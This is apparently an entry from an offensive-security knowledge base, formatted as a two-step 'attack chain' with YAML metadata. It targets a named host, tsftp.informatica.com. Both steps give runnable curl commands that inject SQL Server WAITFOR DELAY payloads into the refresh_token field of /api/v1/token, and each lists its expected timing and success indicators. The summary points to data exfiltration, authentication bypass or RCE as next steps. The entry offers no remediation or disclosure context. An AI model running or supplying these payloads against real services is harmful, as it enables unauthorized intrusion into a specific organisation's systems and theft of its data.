---
tags:
  - sqli
  - blind-sqli
  - time-based
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/time]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Test-Baseline-Response-Delay-with-SQL-Injection]]'
  - '[[procedures/Confirm-SQL-Injection-with-Extended-Delay]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.835Z'
description: >-
  Demonstrates a blind time-based SQL injection vulnerability in the
  refresh_token parameter of the /api/v1/token endpoint, allowing confirmation
  of SQL execution via response delays and potential for data exfiltration or
  RCE.
skill_level: intermediate
impact_level: high
id: 526de3f3-3b88-44e0-8e1b-b0e5b2a61316
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Blind Time-Based SQL Injection in Refresh Token Endpoint for Data Exfiltration

Multi-stage attack chain demonstrating a blind time-based SQL injection in the Informatica tsftp API endpoint to confirm SQL execution and outline paths to data exfiltration.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~15 seconds |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Baseline Delay Test] --> B[Extended Delay Confirmation]
    B --> C[Potential Exfiltration or RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/time]]

### Target Environment

- Web platform with REST API
- SQL Server backend (inferred from WAITFOR DELAY syntax)
- Services: FTP server, Database
- Ports: Standard HTTPS (443)

### Initial Access Requirements

- Network access to https://tsftp.informatica.com
- No credentials required for unauthenticated endpoint testing
- Prior access: Public internet connectivity

## Detailed Attack Procedures

### Step 1: Baseline Response Delay Test

procedure: [[procedures/Test-Baseline-Response-Delay-with-SQL-Injection]]

**Objective**: Establish a baseline response time by injecting a short SQL delay payload into the refresh_token parameter to observe if SQL is executed.

**Instructions**: Use [[commands/curl-baseline-delay]] to send a POST request with a 1-second delay payload:

```bash
time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
```

Measure the response time to confirm a delay of approximately 1 second beyond the baseline.

**Expected Output**: JSON error response like {"error":"invalid_grant"} with total execution time around 2 seconds.

**Success Indicators**:
- Response time includes an additional 1-second delay
- No errors in command execution

### Step 2: Extended Delay Confirmation

procedure: [[procedures/Confirm-SQL-Injection-with-Extended-Delay]]

**Objective**: Confirm the SQL injection by injecting a longer delay payload and observing a significant response time increase, proving blind SQL execution.

**Instructions**: Execute [[commands/curl-extended-delay]] to send a POST request with a 13-second delay payload:

```bash
time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
```

Compare the response time to the baseline to validate the vulnerability.

**Expected Output**: JSON error response like {"error":"invalid_grant"} with total execution time around 14 seconds.

**Success Indicators**:
- Response time includes an additional 13-second delay
- Consistent delay across multiple runs indicates SQL execution

## Attack Chain Summary

### Key Achievements

1. Confirmed blind time-based SQL injection in the refresh_token parameter
2. Demonstrated SQL payload execution via WAITFOR DELAY on SQL Server
3. Outlined potential for data exfiltration from FTP server or authentication bypass

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---

*Last updated: 2023-10-01T00:00:00Z*
